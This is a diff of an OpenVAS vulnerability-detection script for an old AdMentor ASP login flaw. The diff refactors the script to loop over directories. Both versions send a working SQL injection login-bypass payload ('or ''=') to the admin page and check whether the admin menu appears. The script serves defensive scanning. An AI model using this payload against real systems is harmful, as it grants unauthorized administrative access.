@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: admentor_login_flaw.nasl 3298 2016-05-12 10:40:52Z benallard $
+# $Id: admentor_login_flaw.nasl 5786 2017-03-30 10:08:58Z cfi $
 # Description: AdMentor Login Flaw
 #
 # Authors:
@@ -25,22 +25,21 @@
 if(description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.10880");
- script_version("$Revision: 3298 $");
- script_tag(name:"last_modification", value:"$Date: 2016-05-12 12:40:52 +0200 (Thu, 12 May 2016) $");
+ script_version("$Revision: 5786 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 12:08:58 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(4152);
  script_cve_id("CVE-2002-0308");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("AdMentor Login Flaw");
- script_summary("AdMentor Login Flaw");
- 
- script_category(ACT_GATHER_INFO);
- 
+ script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
+
  script_tag(name : "solution" , value : "Contact the author for a patch");
  script_tag(name : "summary" , value : "AdMentor is a totally free ad rotator script written entirely in ASP. 
  A security vulnerability in the product allows remote attackers to
@@ -55,46 +54,29 @@ if(description)
  exit(0);
 }
 
-# Check starts here
-
 include("http_func.inc");
 include("http_keepalive.inc");
-
-function check(req)
-{
-  host = http_host_name( port:port );
-  if ( ! is_cgi_installed_ka(item:req, port:port) ) return NULL;
-
-  variables = string("userid=%27+or+%27%27%3D%27&pwd=%27+or+%27%27%3D%27&B1=Submit");
-  req = string("POST ", req, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen(variables), "\r\n\r\n", variables);
-
-  buf = http_keepalive_send_recv(port:port, data:req);
-  if(buf == NULL)exit(0);
-
-  if (("Welcome" >< buf) && ("Admin interface" >< buf) && ("AdMentor Menu" >< buf))
-  {
-   	security_message(port:port);
-	exit(0);
-  }
- 
- 
- return(0);
-}
 
 port = get_http_port(default:80);
 if ( ! can_host_asp(port:port) ) exit(0);
 
+foreach dir( make_list_unique( "/admentor", "/ads/admentor", cgi_dirs( port:port ) ) ) {
 
-url = string("/admentor/admin/admin.asp?login=yes");
-check(req:url);
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/admin/admin.asp?login=yes");
 
-url = string("/ads/admentor/admin/admin.asp?login=yes");
-check(req:url);
+  if ( ! is_cgi_installed_ka(item:url, port:port) ) continue;
 
-foreach dir (cgi_dirs())
-{
-url = string(dir, "/admentor/admin/admin.asp?login=yes");
-check(req:url);
+  host = http_host_name( port:port );
+  variables = string("userid=%27+or+%27%27%3D%27&pwd=%27+or+%27%27%3D%27&B1=Submit");
+  req = string("POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen(variables), "\r\n\r\n", variables);
+  buf = http_keepalive_send_recv(port:port, data:req);
+  if(buf == NULL) continue;
+
+  if (("Welcome" >< buf) && ("Admin interface" >< buf) && ("AdMentor Menu" >< buf)) {
+    security_message(port:port);
+    exit(0);
+  }
 }
 
 exit(99);
